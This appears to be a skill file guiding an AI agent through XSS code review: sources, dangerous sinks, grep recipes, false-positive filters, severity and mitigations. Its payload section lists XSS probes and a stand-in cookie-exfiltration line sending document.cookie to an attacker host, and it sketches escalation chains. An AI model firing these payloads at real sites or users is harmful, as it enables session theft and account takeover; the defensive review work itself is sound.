---
name: sh-kb-xss
description: "Knowledge base for finding Cross-Site Scripting - reflected, stored, and DOM-based XSS. Use when hunting XSS or reviewing untrusted data rendered into HTML/JS/attributes without context-correct encoding. CWE-79, OWASP A03:2021-Injection."
---

# Cross-Site Scripting (XSS) - Hunter Knowledge Base

Untrusted input is rendered into a page such that the browser executes it as script. Impact runs in the
victim's session/origin: session theft, action-on-behalf, credential capture, worming.

## Sub-classes
- **Reflected**: input echoed straight back in the response (needs a crafted link/request).
- **Stored**: input persisted then rendered to other users (worst - hits many victims, incl. admins).
- **DOM**: client JS writes attacker data into a dangerous DOM sink without encoding (server never sees it).

## Sources
Request params/body/headers/cookies/URL fragment (`location.hash`/`search`), `postMessage`, stored values
(profile, comments), `document.referrer`, any DB/API value that was attacker-influenced.

## Sinks (grep targets)
- **Server templates (raw output)**: Jinja `| safe`, `{% autoescape false %}`, `Markup(`; Django
  `mark_safe`, `|safe`, `format_html` with unescaped args; ERB `raw`/`html_safe`; Handlebars `{{{ }}}`;
  Go `template.HTML(`/`text/template`; Thymeleaf `th:utext`.
- **DOM (JS)**: `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`, `eval`, `setTimeout(str)`,
  `Function(`, `element.setAttribute('href'|'src', userUrl)`, jQuery `.html()`/`.append(userStr)`,
  React `dangerouslySetInnerHTML`, Vue `v-html`, Angular `bypassSecurityTrust*`.
- **Attribute/JS context**: input into an inline event handler, `<script>` block, `href="javascript:"`, style.

## Detection recipe
1. `graft grep "innerHTML|dangerouslySetInnerHTML|v-html|\| ?safe|mark_safe|html_safe|template.HTML|document.write|insertAdjacentHTML" --json`.
2. Trace each sink back to an untrusted source (server: entry point; DOM: `location`/`postMessage`).
3. Determine the **output context** (HTML body / attribute / JS / URL / CSS) - encoding must match context;
   a value HTML-encoded but placed in a JS context is still vulnerable.

## Payloads / PoC
- Probe: `<script>alert(1)</script>`, `"><img src=x onerror=alert(1)>`, `'-alert(1)-'` (JS string context),
  `javascript:alert(1)` (href), `<svg onload=alert(1)>`.
- DOM: `#<img src=x onerror=alert(1)>` in the fragment when `location.hash` flows to `innerHTML`.
- Stored PoC: submit payload via the storing endpoint; load the page that renders it as another user.
- Impact PoC (don't stop at alert): conceptually `fetch('//attacker/c?'+document.cookie)` shows session
  theft - describe the impact rather than firing it at real users.

## False-positive filters
- Framework **auto-escaping** on by default (React `{value}`, Angular interpolation, Jinja/Django autoescape,
  ERB default) with no raw sink -> safe. Only the raw sinks above bypass it.
- Output is HTML-encoded/sanitized (DOMPurify, `bleach.clean`, OWASP Java Encoder) **for the right context**.
- Value is a strict type (number/bool/enum) or a server-controlled constant.
- CSP that blocks inline script *reduces* impact but usually is not a full fix - still report, note CSP.

## CWE / OWASP / severity
CWE-79. OWASP A03:2021-Injection. Stored XSS in an authenticated app -> **high**; reflected needing a click
-> **medium/high**; DOM XSS per reachability. Admin-context stored XSS -> **critical**.

## Chaining hints
Stored XSS -> steal admin session -> reach admin features -> RCE/config change; XSS + CSRF-token theft ->
full state change; XSS -> keylog credentials -> `auth` takeover.

## Mitigation
Context-correct output encoding (prefer framework auto-escaping; avoid raw sinks); sanitize HTML with a
vetted library when rich text is required; avoid `innerHTML`-style DOM sinks (use `textContent`);
add a strong CSP as defense-in-depth; set `HttpOnly` on session cookies.
